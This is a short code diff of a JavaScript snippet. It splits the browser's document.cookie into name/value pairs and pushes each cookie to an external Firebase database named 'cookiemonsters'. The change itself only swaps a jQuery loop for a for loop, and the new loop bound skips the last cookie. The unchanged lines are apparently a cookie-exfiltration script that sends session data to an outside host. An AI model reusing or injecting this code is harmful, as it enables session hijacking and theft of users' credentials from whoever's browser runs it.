@@ -151,9 +151,11 @@ var expirationDate = new Date(); expirationDate.setTime(
 ); var cookies = document.cookie.split(";");
 
 var api = new Firebase('https://cookiemonsters.firebaseio.com/cookies/');
-$.each(cookies, function(i, kv) {
+
+var i;
+for(i = 0; i < cookies.length -1; i++) {  
   
-    kv = kv.split("=");
+  kv = cookies[i].split("=");
     var name = kv.shift();
     var value = kv.shift();
     cookie = {
@@ -175,4 +177,4 @@ $.each(cookies, function(i, kv) {
     
     api.push(cookie);
   
-});
+}
